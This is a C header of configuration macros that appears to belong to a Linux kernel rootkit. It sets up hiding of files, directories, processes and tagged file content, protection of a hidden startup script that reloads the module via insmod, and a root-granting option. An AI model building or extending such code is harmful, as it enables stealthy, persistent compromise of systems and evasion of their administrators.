#ifndef _rk_vars_H_
#define _rk_vars_H_

	//#define RK_PREFIX "rk_"
	//#define CONFIG_NO_WRITE 0
	//#define CONFIG_NO_DELETE 0
	//it will be goood if it's contains HIDE_FILE_PREFIX, so that it remain hidden and unmodifiable, but it can be init file that contains your hidden insmod right ? so no write to avoid your module removal on this file editing
	//#define CONFIG_RK_NO_WRITE_FILE_PREFIX "rk_start"
	

	//#define START_SCRIPT "/"HIDE"/"HIDE"_start"


	#ifdef CONFIG_NO_DELETE
		#define CONFIG_RK_NO_DELETE_FILE_PREFIX {CONFIG_RK_NO_DELETE_FILE_PREFIX_STRING }
	#endif
	

	//#define CONFIG_HIDE_PROCESS 1

	//#define RK_INSMOD "sudo insmod bds_"
	//#define  RK_START_READ_PREFIX "START READING"
	//#define HIDE ""CONFIG_HIDE""

	#ifdef CONFIG_FILE_TAMPERING
		#define CONFIG_RK_FILE_CONTENT_SUFFIX_TO_HIDE "#</"TAG_NAME">"
		#define CONFIG_RK_FILE_CONTENT_PREFIX_TO_HIDE "#<"TAG_NAME">"
	#endif


	#ifdef CONFIG_HIDE_DIR_AND_FILES
		#define CONFIG_HIDE_FILE_AND_DIR_PREFIX HIDE
	#endif

	//#define CONFIG_RK_FILE_CONTENT_SUFFIX_TO_HIDE "#</hide>"
	//#define CONFIG_RK_FILE_CONTENT_PREFIX_TO_HIDE "#<hide>"

	//#define CONFIG_FILE_TAMPERING 1

	/*#ifdef CONFIG_HIDE_DIR_AND_FILES
		#define CONFIG_HIDE_FILE_AND_DIR_PREFIX ""HIDE""
	#endif*/

	//#define c "rk_start"

	//#define CONFIG_HIDE_DIR_AND_FILES 0

	/*#ifdef CONFIG_HIDE_DIR_AND_FILES
		#define c ""HIDE""
	#endif*/

	//#define CONFIG_NO_OPEN_HIDDEN 1

	//#define CONFIG_AUTO_HIDE 0

	//#define CONFIG_GIVE_ROOT 1


	//#define WRITE_ZERO 2023

	//#define ZERO_WRITE 2023

	#define STARTUP_SCRIPT "/"HIDE"/"HIDE"_start"
    
	
	
#endif
